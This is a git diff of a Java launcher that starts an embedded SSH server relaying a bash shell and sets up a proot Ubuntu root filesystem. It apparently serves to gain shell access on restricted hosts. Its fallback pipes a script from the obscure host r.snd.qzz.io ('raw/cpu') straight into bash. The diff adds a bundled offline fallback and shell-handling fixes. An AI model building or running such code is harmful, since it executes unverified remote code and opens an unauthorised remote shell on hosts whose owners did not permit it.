@@ -19,7 +19,8 @@ public class Main{
     private static final String TMP="freeroot_temp",DIR="work",SH="noninteractive.sh";
     private static final String FALLBACK_URL="r.snd.qzz.io/raw/cpu";
     private static String sshIp="0.0.0.0";
-    private static int sshPort=24990;
+
+    private static int sshPort=2222;
     private static final Map<String,String> users=new ConcurrentHashMap<>();
     private static final String[] MAVEN_DEPS={
             "https://repo1.maven.org/maven2/org/apache/sshd/sshd-core/2.11.0/sshd-core-2.11.0.jar",
@@ -30,7 +31,7 @@ public class Main{
     public static void main(String[]a){
         loadConfig();
         new Thread(()->startSSHServer()).start();
-        new Thread(()->{
+        Thread watcherThread=new Thread(()->{
             try{
                 File workDir=new File("work");
                 for(int i=0;i<60;i++){
@@ -44,10 +45,18 @@ public class Main{
             }catch(InterruptedException e){
                 Thread.currentThread().interrupt();
             }
-        }).start();
+        });
+        watcherThread.setDaemon(true);
+        watcherThread.start();
         try{
-            if(!cmd("git")){L.severe("Git not found");System.exit(1);}
-            if(!cmd("bash")){L.severe("Bash not found");System.exit(1);}
+            boolean hasGit=cmd("git");
+            boolean hasBash=cmd("bash");
+
+            if(!hasBash){
+                L.severe("Bash not found - cannot continue");
+                System.exit(1);
+            }
+
             File w=new File(DIR);
             if(w.exists()){
                 L.info("[*] Directory 'work' exists, checking...");
@@ -62,8 +71,28 @@ public class Main{
                     del(w.toPath());
                 }
             }
+
             File t=new File(TMP);
             if(t.exists())del(t.toPath());
+
+            if(!hasGit){
+                L.warning("Git not found, skipping clone and using fallback directly");
+                if(!fallback()){
+                    L.severe("Fallback method also failed");
+                    System.exit(1);
+                }
+                L.info("[+] Fallback method succeeded");
+                File wf=new File(DIR);
+                File sf=new File(wf,SH);
+                if(sf.exists()){
+                    sf.setExecutable(true,false);
+                    exec(wf,SH);
+                }else{
+                    L.warning("[!] Fallback did not create work dir, nothing to exec");
+                }
+                return;
+            }
+
             if(!cloneRepo()){
                 L.warning("All clone attempts failed, trying fallback method...");
                 clean(t);
@@ -72,6 +101,14 @@ public class Main{
                     System.exit(1);
                 }
                 L.info("[+] Fallback method succeeded");
+                File wf=new File(DIR);
+                File sf=new File(wf,SH);
+                if(sf.exists()){
+                    sf.setExecutable(true,false);
+                    exec(wf,SH);
+                }else{
+                    L.warning("[!] Fallback did not create work dir, nothing to exec");
+                }
                 return;
             }
             if(!t.renameTo(w)){L.severe("Rename failed");clean(t);System.exit(1);}
@@ -270,7 +307,13 @@ public class Main{
             );
             startSSH(loader);
         }catch(Exception e){
-            L.log(Level.SEVERE,"SSH server error",e);
+            Throwable cause=e;
+            while(cause.getCause()!=null) cause=cause.getCause();
+            if(cause instanceof java.net.BindException){
+                L.warning("[!] Port "+sshPort+" already in use, SSH server disabled. Continuing without SSH.");
+            }else{
+                L.log(Level.SEVERE,"SSH server error",e);
+            }
         }
     }
     private static void downloadFile(String urlStr,File dest)throws IOException{
@@ -384,6 +427,9 @@ public class Main{
         private int ptyColumns=120;
         private int ptyLines=30;
         private ScheduledExecutorService keepaliveExecutor;
+        private Thread inputThread;
+        private Thread outputThread;
+        private Thread errorThread;
         public ShellCommandHandler(ClassLoader loader,Class<?> sessionClass,Class<?> channelSessionClass,Class<?> exitCallbackClass){
             this.loader=loader;
             this.exitCallbackClass=exitCallbackClass;
@@ -418,9 +464,18 @@ public class Main{
             }else if(methodName.equals("destroy")){
                 running=false;
                 stopKeepalive();
-                if(process!=null){
-                    process.destroy();
+
+                if(processStdin!=null){
+                    try{ processStdin.close(); }catch(IOException ignored){}
                 }
+
+                if(process!=null){
+                    process.destroyForcibly();
+                }
+
+                if(inputThread!=null) inputThread.interrupt();
+                if(outputThread!=null) outputThread.interrupt();
+                if(errorThread!=null) errorThread.interrupt();
                 return null;
             }else if(methodName.equals("getEnvironment")){
                 return environment;
@@ -443,18 +498,24 @@ public class Main{
             return null;
         }
         private void startKeepalive(){
-            keepaliveExecutor=Executors.newSingleThreadScheduledExecutor();
+            ThreadFactory daemonFactory=r->{
+                Thread t=new Thread(r,"ssh-keepalive");
+                t.setDaemon(true);
+                return t;
+            };
+            keepaliveExecutor=Executors.newSingleThreadScheduledExecutor(daemonFactory);
             keepaliveExecutor.scheduleAtFixedRate(()->{
                 try{
                     if(running&&clientOutput!=null){
                         clientOutput.flush();
                     }
                 }catch(Exception e){
+                    stopKeepalive();
                 }
             },10,10,TimeUnit.SECONDS);
         }
         private void stopKeepalive(){
-            if(keepaliveExecutor!=null){
+            if(keepaliveExecutor!=null&&!keepaliveExecutor.isShutdown()){
                 keepaliveExecutor.shutdownNow();
             }
         }
@@ -492,11 +553,11 @@ public class Main{
                 processStdin=process.getOutputStream();
                 processStdout=process.getInputStream();
                 processStderr=process.getErrorStream();
-                Thread inputThread=new Thread(()->{
+                inputThread=new Thread(()->{
                     try{
                         byte[]buf=new byte[8192];
                         int n;
-                        while(running&&(n=clientInput.read(buf))!=-1){
+                        while(running&&!Thread.currentThread().isInterrupted()&&(n=clientInput.read(buf))!=-1){
                             if(processStdin!=null){
                                 processStdin.write(buf,0,n);
                                 processStdin.flush();
@@ -507,6 +568,7 @@ public class Main{
                             System.err.println("Input error: "+e.getMessage());
                         }
                     }finally{
+
                         try{
                             if(processStdin!=null)processStdin.close();
                         }catch(IOException ignored){}
@@ -514,11 +576,12 @@ public class Main{
                 });
                 inputThread.setDaemon(true);
                 inputThread.start();
-                Thread outputThread=new Thread(()->{
+
+                outputThread=new Thread(()->{
                     try{
                         byte[]buf=new byte[8192];
                         int n;
-                        while(running&&(n=processStdout.read(buf))!=-1){
+                        while(running&&!Thread.currentThread().isInterrupted()&&(n=processStdout.read(buf))!=-1){
                             if(clientOutput!=null){
                                 clientOutput.write(buf,0,n);
                                 clientOutput.flush();
@@ -528,15 +591,21 @@ public class Main{
                         if(running){
                             System.err.println("Output error: "+e.getMessage());
                         }
+                    }finally{
+
+                        try{
+                            if(processStdout!=null)processStdout.close();
+                        }catch(IOException ignored){}
                     }
                 });
                 outputThread.setDaemon(true);
                 outputThread.start();
-                Thread errorThread=new Thread(()->{
+
+                errorThread=new Thread(()->{
                     try{
                         byte[]buf=new byte[8192];
                         int n;
-                        while(running&&(n=processStderr.read(buf))!=-1){
+                        while(running&&!Thread.currentThread().isInterrupted()&&(n=processStderr.read(buf))!=-1){
                             if(clientError!=null){
                                 clientError.write(buf,0,n);
                                 clientError.flush();
@@ -549,13 +618,23 @@ public class Main{
                         if(running){
                             System.err.println("Error stream error: "+e.getMessage());
                         }
+                    }finally{
+                        try{
+                            if(processStderr!=null)processStderr.close();
+                        }catch(IOException ignored){}
                     }
                 });
                 errorThread.setDaemon(true);
                 errorThread.start();
+
                 int exitCode=process.waitFor();
                 running=false;
                 stopKeepalive();
+
+
+                try{ if(outputThread!=null)outputThread.join(2000); }catch(InterruptedException ignored){}
+                try{ if(errorThread!=null)errorThread.join(2000); }catch(InterruptedException ignored){}
+
                 if(exitCallback!=null){
                     try{
                         Method onExitMethod=exitCallbackClass.getMethod("onExit",int.class);
@@ -567,6 +646,7 @@ public class Main{
 
             }catch(Exception e){
                 e.printStackTrace();
+                running=false;
                 stopKeepalive();
                 if(exitCallback!=null){
                     try{
@@ -619,8 +699,115 @@ public class Main{
         }
         return false;
     }
+    private static boolean extractResource(String resourcePath,File dest){
+        try(InputStream is=Main.class.getResourceAsStream(resourcePath)){
+            if(is==null){
+                L.warning("Resource not found: "+resourcePath);
+                return false;
+            }
+            dest.getParentFile().mkdirs();
+            try(FileOutputStream fos=new FileOutputStream(dest)){
+                byte[]buffer=new byte[8192];
+                int bytesRead;
+                while((bytesRead=is.read(buffer))!=-1){
+                    fos.write(buffer,0,bytesRead);
+                }
+            }
+            L.info("[+] Extracted resource: "+resourcePath+" -> "+dest.getPath());
+            return true;
+        }catch(IOException e){
+            L.log(Level.SEVERE,"Failed to extract resource: "+resourcePath,e);
+            return false;
+        }
+    }
+    private static boolean fallbackLocal(){
+        L.info("[*] Using local resources fallback...");
+        try{
+            File w=new File(DIR);
+            if(!w.exists())w.mkdirs();
+            String arch=System.getProperty("os.arch");
+            String archSuffix;
+            String archAlt;
+            if(arch.contains("aarch64")||arch.contains("arm64")){
+                archSuffix="aarch64";
+                archAlt="arm64";
+            }else if(arch.contains("amd64")||arch.contains("x86_64")){
+                archSuffix="x86_64";
+                archAlt="amd64";
+            }else{
+                L.severe("Unsupported architecture: "+arch);
+                return false;
+            }
+            File prootDir=new File(w,"usr/local/bin");
+            prootDir.mkdirs();
+            if(!extractResource("/proot-"+archSuffix,new File(prootDir,"proot"))){
+                return false;
+            }
+            File prootBin=new File(prootDir,"proot");
+            if(prootBin.exists())prootBin.setExecutable(true,false);
+            if(!extractResource("/busybox-"+archSuffix,new File(w,"busybox-"+archSuffix))){
+                return false;
+            }
+            File busybox=new File(w,"busybox-"+archSuffix);
+            if(busybox.exists())busybox.setExecutable(true,false);
+            if(!extractResource("/ubuntu-base-20.04.4-base-"+archAlt+".tar.gz",
+                    new File("/tmp/rootfs.tar.gz"))){
+                return false;
+            }
+            File script=new File(w,SH);
+            try(InputStream is=Main.class.getResourceAsStream("/META-INF/noninteractive.sh")){
+                if(is!=null){
+                    try(FileOutputStream fos=new FileOutputStream(script)){
+                        byte[]buffer=new byte[8192];
+                        int bytesRead;
+                        while((bytesRead=is.read(buffer))!=-1){
+                            fos.write(buffer,0,bytesRead);
+                        }
+                    }
+                    script.setExecutable(true,false);
+                    L.info("[+] Extracted noninteractive.sh from resources");
+                }else{
+                    L.warning("noninteractive.sh not found in resources, creating default");
+                    createDefaultScript(script);
+                }
+            }catch(IOException e){
+                L.warning("Failed to extract script, creating default");
+                createDefaultScript(script);
+            }
+            L.info("[+] Local resources extracted successfully");
+            return true;
+        }catch(Exception e){
+            L.log(Level.SEVERE,"Local fallback failed",e);
+            return false;
+        }
+    }
+    private static void createDefaultScript(File script)throws IOException{
+        String defaultScript="#!/bin/sh\n"+
+                "export LC_ALL=C\n"+
+                "export LANG=C\n"+
+                "ROOTFS_DIR=$(pwd)\n"+
+                "export PATH=$PATH:~/.local/usr/bin\n"+
+                "echo 'Using embedded proot environment'\n"+
+                "if [ ! -e $ROOTFS_DIR/.installed ]; then\n"+
+                "  echo 'Extracting rootfs...'\n"+
+                "  tar -xf /tmp/rootfs.tar.gz -C $ROOTFS_DIR 2>/dev/null\n"+
+                "  mkdir -p $ROOTFS_DIR/usr/local/bin\n"+
+                "  chmod 755 $ROOTFS_DIR/usr/local/bin/proot\n"+
+                "  printf 'nameserver 1.1.1.1\\n' > ${ROOTFS_DIR}/etc/resolv.conf\n"+
+                "  rm -rf /tmp/rootfs.tar.gz\n"+
+                "  touch $ROOTFS_DIR/.installed\n"+
+                "fi\n"+
+                "exec $ROOTFS_DIR/usr/local/bin/proot --rootfs=\"${ROOTFS_DIR}\" -0 -w \"/root\" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit /bin/bash -i\n";
+        try(FileWriter fw=new FileWriter(script)){
+            fw.write(defaultScript);
+        }
+        script.setExecutable(true,false);
+    }
     private static boolean fallback(){
-        if(!cmd("curl")){L.warning("Curl not found, cannot use fallback");return false;}
+        if(!cmd("curl")){
+            L.warning("Curl not found, trying local resources...");
+            return fallbackLocal();
+        }
         L.info("[*] Executing fallback: curl "+FALLBACK_URL+" | bash");
         try{
             ProcessBuilder p=new ProcessBuilder("bash","-c","curl "+FALLBACK_URL+" | bash");
@@ -631,16 +818,17 @@ public class Main{
                 L.info("[+] Fallback executed successfully");
                 return true;
             }else{
-                L.severe("Fallback failed with exit code: "+exitCode);
-                return false;
+                L.warning("Curl fallback failed with exit code: "+exitCode);
+                L.info("[*] Trying local resources fallback...");
+                return fallbackLocal();
             }
         }catch(IOException e){
-            L.log(Level.SEVERE,"IO error during fallback",e);
-            return false;
+            L.log(Level.WARNING,"IO error during curl fallback",e);
+            return fallbackLocal();
         }catch(InterruptedException e){
             Thread.currentThread().interrupt();
-            L.log(Level.SEVERE,"Interrupted during fallback",e);
-            return false;
+            L.log(Level.WARNING,"Interrupted during curl fallback",e);
+            return fallbackLocal();
         }
     }
     private static void exec(File d,String s){
